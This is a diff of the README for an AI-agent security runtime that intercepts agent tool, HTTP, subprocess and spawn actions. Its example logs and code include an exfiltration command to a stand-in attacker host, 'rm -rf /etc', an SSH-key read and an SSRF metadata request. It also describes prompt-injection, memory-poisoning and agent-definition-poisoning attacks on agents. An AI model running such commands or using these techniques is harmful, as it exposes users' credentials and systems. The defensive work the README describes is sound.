@@ -11,8 +11,8 @@
 
 ### Security infrastructure for AI agents.
 
-One import. Every agent action inspected before it runs — MCP, direct API, CLI, subprocess.  
-Signed audit artifacts cover all three surfaces. SOC 2, CMMC, and NDAA §1513 ready.
+One import. Every agent action inspected before it runs — MCP, direct API, CLI, subprocess, agent spawns.  
+Signed audit artifacts cover all surfaces. SOC 2, CMMC, and NDAA §1513 ready.
 
 [![PyPI](https://img.shields.io/pypi/v/aiglos?style=flat-square&color=000&labelColor=000&label=aiglos)](https://pypi.org/project/aiglos/)
 [![MIT](https://img.shields.io/badge/license-MIT-000?style=flat-square&labelColor=000)](LICENSE)
@@ -22,9 +22,9 @@ Signed audit artifacts cover all three surfaces. SOC 2, CMMC, and NDAA §1513 re
 
 |                 |                      |                         |                                             |
 |-----------------|----------------------|-------------------------|---------------------------------------------|
-|**10** CVEs filed|**36** threat families|**3** interception layers|**SOC 2 · CMMC · §1513** compliance artifacts|
+|**10** CVEs filed|**38** threat families|**3** interception layers|**SOC 2 · CMMC · §1513** compliance artifacts|
 
-[How it works](#how-it-works) · [Quickstart](#quickstart) · [CVEs](#cve-coverage) · [Attestation](#attestation-artifacts) · [All 36 threats](#threat-families--t1-through-t36) · [Pricing](https://aiglos.dev/pricing) · [Docs](https://docs.aiglos.dev)
+[How it works](#how-it-works) · [Quickstart](#quickstart) · [Multi-agent](#multi-agent-security) · [CVEs](#cve-coverage) · [Attestation](#attestation-artifacts) · [All 38 threats](#threat-families--t1-through-t38) · [Pricing](https://aiglos.dev/pricing) · [Docs](https://docs.aiglos.dev)
 
 </div>
 
@@ -42,7 +42,9 @@ import aiglos  # every agent action below this line is inspected
 
 ## What just happened
 
-Seven events in 72 hours turned AI agent security from a developer concern into a geopolitical and market-structure fact.
+Eight events changed the AI agent security landscape in under two weeks.
+
+**March 9 — McKinsey/Lilli: the first AI-vs-AI attack at enterprise scale.** An autonomous agent named CodeWall selected McKinsey as a target with no human input. It found 22 unauthenticated API endpoints, exploited SQL injection via JSON key reflection in error messages, and gained full read-write access to 46.5 million chat messages, 728,000 files, 57,000 accounts, and — critically — every system prompt in the Lilli platform. The entire operation took two hours. Because the system prompts were writable, CodeWall reprogrammed Lilli silently. For an unknown window, 40,000 McKinsey consultants were talking to a Lilli that had been modified by an attacker. This is a new attack class: machine-speed, fully autonomous, no human in the loop. Aiglos T27 (prompt inject) blocks writable system prompt access. T20 (data exfil) catches the API calls that preceded it.
 
 **March 10 — OpenClaw hits critical mass.** Tencent shares rose 7.3% after launching WorkBuddy, a fully OpenClaw-compatible workplace agent. Zhipu surged 13% after launching AutoClaw. MiniMax soared 22%. Every major Chinese platform company bet on the same technology in the same week. SecurityScorecard’s STRIKE team counted 135,000 OpenClaw instances exposed to the public internet, 93.4% with authentication bypass conditions and 15,000+ vulnerable to remote code execution. This is not a developer tool anymore. It is infrastructure.
 
@@ -58,15 +60,13 @@ Seven events in 72 hours turned AI agent security from a developer concern into 
 
 Their recommended fix for all three: *“planned improvements.”*
 
-**March 11 — GhostClaw: live supply chain attack targeting OpenClaw developers.** Security researchers at JFrog uncovered a malicious npm package posing as the OpenClaw installer. It deploys GhostLoader, a RAT that steals SSH keys, AWS credentials, browser passwords, crypto wallets, Kubernetes configs, and AI tool configurations including files from OpenClaw environments. The attack exploits the install frenzy directly. The vector is T30 SUPPLY_CHAIN. The package was live as developers rushed to install OpenClaw for the first time.
+**March 11 — GhostClaw: live supply chain attack targeting OpenClaw developers.** Security researchers at JFrog uncovered a malicious npm package posing as the OpenClaw installer. It deploys GhostLoader, a RAT that steals SSH keys, AWS credentials, browser passwords, crypto wallets, Kubernetes configs, and AI tool configurations including files from OpenClaw environments. The attack exploits the install frenzy directly. The vector is T30 SUPPLY_CHAIN.
 
-**March 11 — China bans OpenClaw from government and state enterprise computers.** Bloomberg reported that China moved to restrict banks, state firms, and government bodies from using OpenClaw on office computers over security concerns. Chinese tech hubs in Shenzhen and Wuxi simultaneously announced programs to build local industry around OpenClaw. The same country is banning it from government and racing to deploy it commercially. That is not contradiction. That is a security gap being recognized and managed by a nation-state while the West has no equivalent response.
+**March 11 — China bans OpenClaw from government and state enterprise computers.** Bloomberg reported that China moved to restrict banks, state firms, and government bodies from using OpenClaw over security concerns. Chinese tech hubs simultaneously announced programs to build local industry around OpenClaw. The same country is banning it from government and racing to deploy it commercially. That is not contradiction. That is a security gap being recognized and managed by a nation-state while the West has no equivalent response.
 
 **March 11 — Nvidia starts over with NemoClaw.** Nvidia is developing NemoClaw, an open-source challenger to OpenClaw built explicitly around stronger security and privacy protections, with early partnerships at Adobe, Google, and Salesforce. When the world’s largest AI infrastructure company decides the answer to OpenClaw is a security-first rewrite, the market has confirmed the gap.
 
-**March 11 — Nvidia drops Nemotron Super: 1M context, 120B parameters, open weights, 5x faster.** This is not an incremental model release. This is a structural change to the threat model. An agent running Nemotron Super locally can load an entire codebase into a single context window and reason across the full dependency graph, CI/CD config, and secrets layout before making a single outbound call. The per-call scanner catches malicious tool calls. It does not catch reconnaissance that happens entirely within a 1M-token context window. Open weights mean local inference: no API-level guardrails, no provider rate limits, no endpoint to monitor, fine-tunable to ignore safety prompts. The attack unit is no longer a tool call. It is a campaign assembled in one inference pass that executes in one clean-looking tool call. Aiglos is adding campaign-mode session analysis — T06 extended — to address exactly this vector.
-
-Aiglos is the runtime layer for the OpenClaw ecosystem that exists today, while Nvidia builds the one for tomorrow. Nemotron Super is the model that will run inside it.
+**March 11 — agency-agents reaches 31,000 GitHub stars.** The agency-agents repo ships 120 specialized Claude Code sub-agents organized into 12 business divisions. The install path is `cp -r agency-agents/* ~/.claude/agents/`. Any file dropped into `~/.claude/agents/` silently reprograms every Claude Code session on that machine. Aiglos T36_AGENTDEF now gates all writes to agent definition directories at the subprocess layer. T38 detects sub-agent spawn events and records them in the multi-agent session artifact.
 
 -----
 
@@ -87,10 +87,10 @@ your agent  ──►  [ aiglos ]  ──►  action executes
                      ▼
               blocked / warned / attested
 
-Works across: MCP tool calls · direct HTTP/API calls · CLI execution · subprocess spawning
+Works across: MCP tool calls · direct HTTP/API calls · CLI execution · subprocess spawning · agent spawns
 ```
 
-Aiglos attaches to your agent process at import time. No proxy. No port. No config file. Every agent action passes through 36 rule families before execution — whether the agent calls an MCP server, a REST endpoint directly, or spawns a subprocess. Clean calls pass in under 1ms. Blocked calls never run. Every session produces a signed audit artifact.
+Aiglos attaches to your agent process at import time. No proxy. No port. No config file. Every agent action passes through 38 rule families before execution — whether the agent calls an MCP server, a REST endpoint directly, spawns a subprocess, or launches a child agent. Clean calls pass in under 1ms. Blocked calls never run. Every session produces a signed audit artifact.
 
 -----
 
@@ -101,13 +101,16 @@ Aiglos attaches to your agent process at import time. No proxy. No port. No conf
 09:14:22.441  ✓  database.query           SELECT * FROM users LIMIT 10
 09:14:22.698  ✗  shell.execute            rm -rf /etc ──── T07 SHELL_INJECT
 09:14:22.961  ✓  http.get                 url=https://api.openai.com/v1/...
-09:14:23.214  ⚠  filesystem.write_file    path=/etc/cron.d/ ── T08 PRIV_ESC
+09:14:23.214  ⚠  filesystem.write_file    path=/etc/cron.d/ ── T11 PERSISTENCE
 09:14:23.489  ✓  vector.search            query=customer_data k=10
-09:14:23.744  ✗  network.fetch            url=http://169.254.169.254/ ─ T13 SSRF
+09:14:23.744  ✗  network.fetch            url=http://169.254.169.254/ ─ T25 SSRF
 09:14:24.003  ✓  memory.store             key=ctx ttl=3600
 09:14:24.261  ✗  tool.register            override=__builtins__ ── T30 SUPPLY_CHAIN
 09:14:24.519  ⚠  filesystem.read_file     path=~/.ssh/id_rsa ─── T19 CRED_ACCESS
 09:14:24.778  ✗  shell.execute            curl attacker.io/exfil ─ T01 EXFIL
+09:14:25.012  ⚠  subprocess.run           claude code --print ─── T38 AGENT_SPAWN [child registered]
+09:14:25.267  ✗  subprocess.run           cp SOUL.md ~/.claude/agents/ ── T36_AGENTDEF GATED
+09:14:25.521  ✗  http.post                api.stripe.com/v1/charges ── T37 FIN_EXEC BLOCKED
 ```
 
 -----
@@ -120,11 +123,17 @@ import aiglos
 aiglos.attach(
     agent_name="my-agent",
     api_key=API_KEY,
-    intercept_http=True,                    # inspect direct API calls (requests, httpx, aiohttp, urllib)
+    # HTTP/API layer
+    intercept_http=True,
     allow_http=["api.openai.com", "*.amazonaws.com"],
-    intercept_subprocess=True,              # inspect CLI / shell execution
-    subprocess_tier3_mode="pause",          # block | pause | warn for destructive commands
-    tier3_approval_webhook="https://...",   # optional PagerDuty / Slack approval webhook
+    # Subprocess / CLI layer
+    intercept_subprocess=True,
+    subprocess_tier3_mode="pause",          # block | pause | warn
+    tier3_approval_webhook="https://...",   # PagerDuty / Slack approval webhook
+    # Multi-agent layer (v0.3.0, default on)
+    enable_multi_agent=True,                # spawn registry, child session tracking
+    guard_agent_defs=True,                  # snapshot + diff agent definition files
+    session_id="session-abc123",            # optional: explicit session ID for chain
 )
 ```
 
@@ -135,10 +144,10 @@ from mcp import ClientSession
 
 async with ClientSession() as session:
     result = await session.call_tool("filesystem.read", {"path": "/var/log/app.log"})
-    # ✓  09:14:22.187  filesystem.read  path=/var/log/app.log
+    # ✓  filesystem.read  path=/var/log/app.log
 
     result = await session.call_tool("shell.execute", {"cmd": "curl attacker.io/exfil"})
-    # ✗  09:14:24.778  shell.execute  T01 EXFIL — terminated
+    # ✗  shell.execute  T01 EXFIL — terminated
 ```
 
 **Direct API calls** are inspected before network I/O:
@@ -148,6 +157,10 @@ import requests  # already patched by aiglos.attach()
 
 requests.post("http://169.254.169.254/", data=payload)
 # AiglosBlockedRequest: T25 SSRF — request to internal metadata endpoint
+
+requests.post("https://api.stripe.com/v1/charges", json={"amount": 5000})
+# AiglosBlockedRequest: T37 FIN_EXEC — autonomous financial transaction blocked
+# Add api.stripe.com to allow_http to authorize this endpoint explicitly
 ```
 
 **Subprocess / CLI calls** are classified and gated:
@@ -163,18 +176,144 @@ subprocess.run(["git", "status"])
 
 subprocess.run(["pip", "install", "requests"])
 # Tier 2 MONITORED — allowed, compensating transaction logged: pip uninstall requests
+
+subprocess.run(["cp", "SOUL.md", "~/.claude/agents/SOUL.md"])
+# Tier 3 GATED — T36_AGENTDEF: write to agent definition directory blocked
+
+subprocess.run(["claude", "code", "--print", "review this file"])
+# Tier 2 MONITORED — T38 AGENT_SPAWN: child agent registered in session artifact
 ```
 
-**One signed artifact covers all three surfaces:**
+**One signed artifact covers all surfaces:**
 
 ```python
 artifact = aiglos.close()
-# artifact.total_calls   → 47
-# artifact.blocked_calls → 3  (1 MCP + 1 HTTP + 1 subprocess)
-# artifact.signature     → RSA-2048 signed, NDAA §1513 ready
+# artifact.total_calls          → 47
+# artifact.blocked_calls        → 4  (MCP + HTTP + subprocess + agentdef)
+# artifact.extra["agentdef_violation_count"] → 0  (no mid-session definition tampering)
+# artifact.extra["multi_agent"]["child_count"] → 2
+# artifact.signature            → HMAC-SHA256 signed, NDAA §1513 ready
 ```
 
-Designed for LangChain, LlamaIndex, AutoGen, CrewAI, and n8n. Works with any agent framework — MCP-based, direct API callers, CLI runners, and subprocess-spawning agents alike.
+-----
+
+## Multi-agent security
+
+v0.3.0 ships three capabilities specifically for multi-agent orchestration frameworks — agency-agents, OpenClaw Orchestrator, LangGraph multi-agent, CrewAI, and similar.
+
+### Agent definition file integrity (AgentDefGuard)
+
+When `attach()` is called, Aiglos snapshots every agent definition file on disk: `~/.claude/agents/`, `.cursor/rules/`, `~/.openclaw/`, `~/.gemini/agents/`, `SOUL.md`, `IDENTITY.md`, `AGENTS.md`, and others. Any modification to these files during an active session is flagged as `T36_AGENTDEF + T27_PROMPT_INJECT`.
+
+This is the McKinsey/Lilli attack class applied at the developer workstation level. A compromised agent or malicious install script that writes to your agent definition directory silently reprograms every future Claude Code session on that machine. Aiglos catches it.
+
+```python
+from aiglos.integrations.multi_agent import AgentDefGuard
+
+guard = AgentDefGuard()
+guard.snapshot()                 # hash all agent definition files at session start
+
+# ... agent runs ...
+
+violations = guard.check()       # diff against baseline
+for v in violations:
+    print(v.violation_type, v.path)  # MODIFIED / ADDED / DELETED
+    print(v.rule_id)                 # T36_AGENTDEF
+    print(v.threat_family)           # T27_PROMPT_INJECT + T36_AGENTDEF
+```
+
+`close()` runs a final check automatically. Violations appear in the session artifact under `extra["agentdef_violations"]`.
+
+### Sub-agent spawn registry (MultiAgentRegistry)
+
+When a parent agent spawns a child agent, Aiglos records the spawn event and chains the child session to the parent in the artifact. The full parent-to-child tree is available at session close.
+
+```python
+from aiglos.integrations.multi_agent import MultiAgentRegistry
+
+registry = MultiAgentRegistry(root_session_id="session-abc", root_agent_name="orchestrator")
+
+# When T38 fires (subprocess layer detects an agent spawn):
+registry.register_spawn(
+    parent_id="session-abc",
+    child_id="session-def",
+    cmd="claude code --print",
+    agent_name="security-engineer",
+)
+
+# At close, the artifact includes the full spawn tree:
+print(registry.to_dict())
+# {
+#   "root_session_id": "session-abc",
+#   "child_count": 8,
+#   "spawns": [...],
+#   "children": { "session-def": { "agent_name": "security-engineer", "events": [...] } }
+# }
+```
+
+### Session identity chain (SessionIdentityChain)
+
+Each Aiglos session generates a session key at attach time. Every event in the artifact is HMAC-SHA256 countersigned with the session key. The `public_token` (SHA-256 of the key) is embedded in the artifact header so downstream verifiers can confirm that all events belong to this session and none were injected from a different agent context.
+
+```python
+from aiglos.integrations.multi_agent import SessionIdentityChain
+
+chain = SessionIdentityChain(agent_name="orchestrator")
+
+# Signing is automatic when events are logged — but the API is available directly:
+event = {"rule_id": "T07", "verdict": "BLOCK", "cmd": "rm -rf /"}
+chain.sign_event(event)   # adds session_sig, session_id, event_seq fields
+
+chain.verify(event)       # True
+event["verdict"] = "ALLOW"
+chain.verify(event)       # False — tampering detected
+```
+
+### T36_AGENTDEF — agent definition file poisoning
+
+Writes to agent definition directories are **Tier 3 GATED** at the subprocess layer. This runs before all other Tier 1/2 classification so it catches even read-only commands that access these paths.
+
+|Path                            |Context              |Verdict                        |
+|--------------------------------|---------------------|-------------------------------|
+|`~/.claude/agents/` (write)     |agency-agents install|Tier 3 GATED — T36_AGENTDEF    |
+|`.cursor/rules/` (write)        |Cursor agent config  |Tier 3 GATED — T36_AGENTDEF    |
+|`~/.openclaw/` (write)          |OpenClaw agent dir   |Tier 3 GATED — T36_AGENTDEF    |
+|`SOUL.md`, `IDENTITY.md` (write)|Identity file write  |Tier 3 GATED — T36_AGENTDEF    |
+|`~/.claude/agents/` (read)      |`ls`, `cat` access   |Tier 2 MONITORED — T36_AGENTDEF|
+|Any unrelated path              |Normal operation     |Standard tier classification   |
+
+### T38 AGENT_SPAWN — sub-agent process spawning
+
+Detected commands that spawn a child agent are **Tier 2 MONITORED** and registered in the multi-agent session artifact. Aiglos records the spawn so the parent-to-child action chain is auditable.
+
+|Command                               |Context              |Rule           |
+|--------------------------------------|---------------------|---------------|
+|`claude code --print`                 |Claude Code sub-agent|T38 AGENT_SPAWN|
+|`openclaw run <agent>`                |OpenClaw sub-agent   |T38 AGENT_SPAWN|
+|`python orchestrator_agent.py`        |Python agent runner  |T38 AGENT_SPAWN|
+|`node run_agent.mjs`                  |Node agent runner    |T38 AGENT_SPAWN|
+|`./convert.sh` / `./install.sh --tool`|agency-agents scripts|T38 AGENT_SPAWN|
+
+### T37 FIN_EXEC — financial transaction execution
+
+Autonomous financial API calls are **blocked by default** in the HTTP layer. Covers payment processors (Stripe, PayPal, Square, Braintree, Adyen), blockchain execution (Ethereum sendTransaction via Infura/Alchemy), and ACH/wire APIs (Dwolla, Plaid Transfer). GET requests are unaffected — read access is never blocked. Explicitly add the host to `allow_http` to authorize an endpoint.
+
+```python
+aiglos.attach(
+    agent_name="finops-agent",
+    intercept_http=True,
+    # Explicitly authorize payment endpoints:
+    allow_http=["api.stripe.com", "api.plaid.com/accounts"],
+)
+```
+
+|Host                                            |Method|Verdict             |
+|------------------------------------------------|------|--------------------|
+|`api.stripe.com/v1/charges`                     |POST  |T37 FIN_EXEC BLOCKED|
+|`mainnet.infura.io` + `eth_sendTransaction` body|POST  |T37 FIN_EXEC BLOCKED|
+|`mainnet.infura.io` + `eth_call` body           |POST  |ALLOW (read-only)   |
+|`api.stripe.com` (allow-listed)                 |POST  |ALLOW               |
+|`api.stripe.com/v1/charges`                     |GET   |ALLOW               |
 
 -----
 
@@ -208,13 +347,46 @@ That’s the gap Aiglos fills.
 
 `T30` scans ClawHub in real time. Every skill in the registry is monitored for malicious tool call payloads before your agent installs it.
 
+v0.3.0 adds `T36_AGENTDEF` specifically for the agency-agents ecosystem: `cp -r agency-agents/* ~/.claude/agents/` is now a Tier 3 GATED operation.
+
 A drop-in `SKILL.md` for your OpenClaw agent is in [`skills/openclaw/SKILL.md`](skills/openclaw/SKILL.md).
+
+-----
+
+## Using coding agents? (Cursor, Claude Code, Copilot, Aider)
+
+Coding agents don’t use MCP. They use `subprocess.run()` and `requests.post()` directly. Aiglos intercepts both before execution.
+
+```python
+import aiglos
+
+aiglos.attach(
+    agent_name="cursor-session",
+    intercept_http=True,
+    intercept_subprocess=True,
+    subprocess_tier3_mode="pause",
+    guard_agent_defs=True,      # snapshot .cursor/rules/, .claude/agents/, etc.
+    enable_multi_agent=True,    # track any spawned sub-agents
+)
+```
+
+What Aiglos covers across coding agent sessions:
+
+|Risk                                             |Aiglos rule                                      |
+|-------------------------------------------------|-------------------------------------------------|
+|Agent deletes production environment             |Tier 3 GATED — T_DEST                            |
+|Agent reads `~/.ssh/id_rsa`                      |T19 CRED_HARVEST                                 |
+|Agent writes to `.cursor/rules/` (rule poisoning)|T36_AGENTDEF GATED                               |
+|Agent spawns another Claude Code session         |T38 AGENT_SPAWN (registered in artifact)         |
+|Agent POSTs to Stripe autonomously               |T37 FIN_EXEC BLOCKED                             |
+|Agent installs npm package                       |Tier 2 MONITORED, compensating transaction logged|
+|Agent runs `git push --force`                    |Tier 3 GATED                                     |
 
 -----
 
 ## Using hermes-agent?
 
-The Nous Research hermes batch runner generates thousands of tool-calling trajectories for RL training. If any trajectory contains unsafe tool calls, the model learns those patterns as acceptable. Aiglos covers the full hermes tool surface and adds one capability unique to hermes: `sign_trajectory()`.
+The Nous Research hermes batch runner generates thousands of tool-calling trajectories for RL training. If any trajectory contains unsafe tool calls, the model learns those patterns as acceptable. Aiglos covers the full hermes tool surface and adds `sign_trajectory()`.
 
 ```python
 from aiglos.integrations.hermes import HermesGuard
@@ -226,85 +398,48 @@ result = guard.before_tool_call("terminal", {"command": cmd})
 if result.blocked:
     raise RuntimeError(result.reason)
 
-# sign batch runner trajectories before RL training
+# Sign batch runner trajectories before RL training
 signed = guard.sign_trajectory(trajectory_dict)
 # signed["_aiglos"] — artifact_id, signature, blocked_calls
 
 artifact = guard.close_session()
 ```
 
-This is not just “secure your production agent.” It is “secure your training data.” A signed trajectory artifact shows clean vs. flagged calls before those patterns get baked into the next model version.
-
 A drop-in `SKILL.md` for hermes is in [`skills/hermes/SKILL.md`](skills/hermes/SKILL.md).
-
------
-
-## Using NanoClaw?
-
-NanoClaw handles container isolation — containing the blast radius if something goes wrong. Aiglos handles what happens inside the container: tool call inspection, credential scanning, and the signed audit trail your compliance team needs.
-
-Different problems. Work well together.
-
-```bash
-# inside your NanoClaw container
-pip install aiglos
-```
 
 -----
 
 ## Using memory stacks?
 
-The three-tier memory architecture that’s become standard for serious Claude
-operators (CLAUDE.md for session context, MEMORY.md for persistent observations,
-an Obsidian vault as a searchable knowledge graph) creates an attack surface that
-grows with how well you use it. The more your agent knows about your architecture,
-your credentials, and your conventions, the more damage a compromised session can do.
+The three-tier memory architecture that’s become standard for serious Claude operators (CLAUDE.md for session context, MEMORY.md for persistent observations, an Obsidian vault as a searchable knowledge graph) creates an attack surface that grows with how well you use it. The more your agent knows about your architecture, your credentials, and your conventions, the more damage a compromised session can do.
 
-Aiglos was built for exactly this setup. Every write-target the memory stack
-recommends is monitored at the runtime layer:
+v0.3.0 `AgentDefGuard` extends this coverage to agent definition files specifically:
 
-|Memory component          |Attack vector                              |Aiglos rule       |
-|--------------------------|-------------------------------------------|------------------|
-|`SOUL.md` / `CLAUDE.md`   |System prompt hijack via write             |T27 PROMPT_INJECT |
-|`MEMORY.md` / `USER.md`   |Inject false beliefs into persistent memory|T31 MEMORY_POISON |
-|`AGENTS.md` / agent config|Tamper with agent behavior between sessions|T36 ORCHESTRATION |
-|`cron/` / `HEARTBEAT.md`  |Schedule unauthorized execution cycles     |T34 DATA_AGENT    |
-|Obsidian vault via MCP    |Poisoned notes retrieved into context      |T28 CONTEXT_POISON|
-|`~/.hermes/.env` / secrets|Credential harvest during memory access    |T19 CRED_ACCESS   |
+|Memory component          |Attack vector                              |Aiglos rule                     |
+|--------------------------|-------------------------------------------|--------------------------------|
+|`SOUL.md` / `CLAUDE.md`   |System prompt hijack via write             |T36_AGENTDEF + T27 PROMPT_INJECT|
+|`MEMORY.md` / `USER.md`   |Inject false beliefs into persistent memory|T31 MEMORY_POISON               |
+|`AGENTS.md` / agent config|Tamper with agent behavior between sessions|T36_AGENTDEF GATED              |
+|`~/.claude/agents/`       |Silent agent reprogramming via cp/mv       |T36_AGENTDEF GATED              |
+|`cron/` / `HEARTBEAT.md`  |Schedule unauthorized execution cycles     |T11 PERSISTENCE                 |
+|Obsidian vault via MCP    |Poisoned notes retrieved into context      |T28 CONTEXT_POISON              |
+|`~/.hermes/.env` / secrets|Credential harvest during memory access    |T19 CRED_ACCESS                 |
 
-The knowledge graph compounds what your agent knows. Aiglos ensures that what
-gets written into that graph is what you intended.
-
-```python
-import aiglos
-
-aiglos.attach(agent_name="my-agent", policy="enterprise")
-
-# memory write — Aiglos checks before it lands
-result = aiglos.check("write_file", {
-    "path": "~/.hermes/memories/MEMORY.md",
-    "content": new_memory_content,
-})
-if result.blocked:
-    raise RuntimeError(result.reason)
-```
-
-The session artifact at close is itself part of the memory stack: a signed record
-of every tool call the agent made, ready to load into the next session as
-verified provenance.
+The session artifact at close is itself part of the memory stack: a signed record of every tool call the agent made, ready to load into the next session as verified provenance.
 
 -----
 
 ## Why this exists
 
-In February 2026, the OpenClaw incident made the problem impossible to ignore:
+In early 2026, the McKinsey/Lilli incident and the OpenClaw events made the problem impossible to ignore:
 
-|What happened                            |Scale        |
-|-----------------------------------------|-------------|
-|Malicious skills confirmed in ClawHub    |**341**      |
-|Agent instances publicly exposed, no auth|**135,000**  |
-|Agent tokens leaked via Supabase         |**1,500,000**|
-|CVEs filed against AI agents             |**10**       |
+|What happened                                                     |Scale                     |
+|------------------------------------------------------------------|--------------------------|
+|McKinsey/Lilli — writable system prompts, 40K consultants affected|**2 hours** to full access|
+|OpenClaw instances exposed, 93.4% authentication bypass           |**135,000**               |
+|Agent tokens leaked via Supabase                                  |**1,500,000**             |
+|CVEs filed against AI agents                                      |**10**                    |
+|agency-agents GitHub stars (install vector for T36_AGENTDEF)      |**31,000**                |
 
 Unmonitored agent fleets create compounding exposure: the same misconfiguration that produces a security event also produces an unbudgeted cloud cost event. Aiglos addresses both at the same interception point.
 
@@ -316,76 +451,79 @@ Framework vendors built for speed. Security was deferred. Aiglos closes the gap.
 
 Everything OpenClaw exposed, Aiglos catches. Module-by-module.
 
-|CVE / Incident           |Attack                                                                                                                                                                                                                                                                                                                                                           |Module           |
-|-------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|-----------------|
-|`CVE-2026-25253` CVSS 8.8|**ClawJacked** — WebSocket to localhost brute-forces gateway password via missing rate limiting                                                                                                                                                                                                                                                                  |`T01` `T25`      |
-|`CVE-2026-24763`         |Command injection via shell tool parameters                                                                                                                                                                                                                                                                                                                      |`T07`            |
-|`CVE-2026-25157`         |Path traversal in filesystem tools                                                                                                                                                                                                                                                                                                                               |`T03`            |
-|`CVE-2026-24891`         |SSRF via agent network fetch                                                                                                                                                                                                                                                                                                                                     |`T13`            |
-|`CVE-2026-25001`         |Credential exfiltration via plaintext log                                                                                                                                                                                                                                                                                                                        |`T32` `T01`      |
-|`CVE-2026-25089`         |Malicious registry skill auto-execution                                                                                                                                                                                                                                                                                                                          |`T30`            |
-|`CVE-2026-24612`         |Persistent memory poisoning                                                                                                                                                                                                                                                                                                                                      |`T31`            |
-|`CVE-2026-25198`         |Agent-to-agent protocol hijacking                                                                                                                                                                                                                                                                                                                                |`T29`            |
-|`CVE-2026-24774`         |OAuth confused deputy via MCP tool auth                                                                                                                                                                                                                                                                                                                          |`T25`            |
-|`CVE-2026-25312`         |Heartbeat loop: crafted `HEARTBEAT.md` triggers unbounded scheduled execution                                                                                                                                                                                                                                                                                    |`T06` `T24`      |
-|Incident Feb 2026        |**ClawHub / SkillsMP malicious skills** — 820 of 10,700 ClawHub skills confirmed malicious; attackers used professional READMEs and names like “solana-wallet-tracker” to distribute keyloggers and Atomic Stealer                                                                                                                                               |`T26` `T30`      |
-|Incident Mar 2026        |**GhostClaw** — malicious npm package posing as OpenClaw installer; deploys persistent RAT stealing SSH keys, AWS credentials, browser passwords, and crypto wallets (JFrog, confirmed live on launch day)                                                                                                                                                       |`T26` `T30`      |
-|Research Jan 2026        |**Log poisoning / indirect prompt injection** — malicious content written to agent log files via WebSocket; agent reads own logs to troubleshoot, executing embedded payload                                                                                                                                                                                     |`T21` `T31`      |
-|Research Jan 2026        |**Auth-disabled instances** — 1,000 publicly accessible OpenClaw installations running without authentication, bound to 0.0.0.0                                                                                                                                                                                                                                  |`T04`            |
-|Research Feb 2026        |**Prompt injection via messaging apps** — inbound Slack/email message instructs agent to read credential files; anyone who can message the agent inherits its full permissions                                                                                                                                                                                   |`T06`            |
-|Threat Mar 2026          |**Nemotron Super 1M-context campaign attacks** — open-weight 120B model runs locally with no API guardrails; agent loads full codebase into single context window, performs silent reconnaissance across all secrets and auth flows, then emits one minimally suspicious tool call; per-call scanners see a clean call, not the reasoning chain that assembled it|`T06` `T22` `T27`|
-|Research Mar 2026        |**Moltbook A2A attacks** — OpenClaw agent-to-agent communication surface enables cross-agent privilege escalation via Agent Card artifacts                                                                                                                                                                                                                       |`T29`            |
+|CVE / Incident           |Attack                                                                                                                                                                                                                   |Module           |
+|-------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|-----------------|
+|`CVE-2026-25253` CVSS 8.8|**ClawJacked** — WebSocket to localhost brute-forces gateway password via missing rate limiting                                                                                                                          |`T01` `T25`      |
+|`CVE-2026-24763`         |Command injection via shell tool parameters                                                                                                                                                                              |`T07`            |
+|`CVE-2026-25157`         |Path traversal in filesystem tools                                                                                                                                                                                       |`T03`            |
+|`CVE-2026-24891`         |SSRF via agent network fetch                                                                                                                                                                                             |`T13`            |
+|`CVE-2026-25001`         |Credential exfiltration via plaintext log                                                                                                                                                                                |`T32` `T01`      |
+|`CVE-2026-25089`         |Malicious registry skill auto-execution                                                                                                                                                                                  |`T30`            |
+|`CVE-2026-24612`         |Persistent memory poisoning                                                                                                                                                                                              |`T31`            |
+|`CVE-2026-25198`         |Agent-to-agent protocol hijacking                                                                                                                                                                                        |`T29`            |
+|`CVE-2026-24774`         |OAuth confused deputy via MCP tool auth                                                                                                                                                                                  |`T25`            |
+|`CVE-2026-25312`         |Heartbeat loop: crafted `HEARTBEAT.md` triggers unbounded scheduled execution                                                                                                                                            |`T06` `T24`      |
+|Incident Mar 2026        |**McKinsey/Lilli** — AI vs. AI, 22 unauthenticated endpoints, SQL injection via JSON reflection, 46.5M chat messages + 728K files + writable system prompts for 40K consultants, 2 hours                                 |`T27` `T20`      |
+|Incident Feb 2026        |**ClawHub / SkillsMP malicious skills** — 820 of 10,700 ClawHub skills confirmed malicious; attackers used professional READMEs and names like “solana-wallet-tracker” to distribute keyloggers and Atomic Stealer       |`T26` `T30`      |
+|Incident Mar 2026        |**GhostClaw** — malicious npm package posing as OpenClaw installer; deploys persistent RAT stealing SSH keys, AWS credentials, browser passwords, and crypto wallets                                                     |`T26` `T30`      |
+|Incident Mar 2026        |**agency-agents T36_AGENTDEF** — 120-agent repo, install via `cp -r agency-agents/* ~/.claude/agents/`, silently reprograms every Claude Code session on the host                                                        |`T36_AGENTDEF`   |
+|Research Jan 2026        |**Log poisoning / indirect prompt injection** — malicious content written to agent log files via WebSocket; agent reads own logs to troubleshoot, executing embedded payload                                             |`T21` `T31`      |
+|Research Jan 2026        |**Auth-disabled instances** — 1,000 publicly accessible OpenClaw installations running without authentication, bound to 0.0.0.0                                                                                          |`T04`            |
+|Research Feb 2026        |**Prompt injection via messaging apps** — inbound Slack/email message instructs agent to read credential files                                                                                                           |`T06`            |
+|Threat Mar 2026          |**Nemotron Super 1M-context campaign attacks** — open-weight 120B model runs locally; agent loads full codebase into single context window, performs silent reconnaissance, then emits one minimally suspicious tool call|`T06` `T22` `T27`|
+|Research Mar 2026        |**Moltbook A2A attacks** — agent-to-agent protocol enables cross-agent privilege escalation via Agent Card artifacts                                                                                                     |`T29`            |
 
 Full CVE database: <CVES.md>
 
 **Free ClawHub skill scanner:** `python -m aiglos scan-skill <skill-name>` or [aiglos.dev/scan](https://aiglos.dev/scan)
-Scan any ClawHub or SkillsMP skill against 8 risk signals before installing. T26 + T30 in two seconds.
 
 -----
 
-## Threat families — T1 through T36
+## Threat families — T1 through T38
 
 <details>
-<summary><strong>Expand all 36 threat families</strong></summary>
+<summary><strong>Expand all 38 threat families</strong></summary>
 
-|ID   |Family              |Description                                                       |MITRE ATLAS  |
-|-----|--------------------|------------------------------------------------------------------|-------------|
-|`T01`|**EXFIL**           |Credential and data exfiltration via network calls                |AML.T0009    |
-|`T02`|**INJECT**          |SQL, command, and code injection via tool parameters              |AML.T0043    |
-|`T03`|**TRAVERSAL**       |Path traversal and directory escape                               |AML.T0043    |
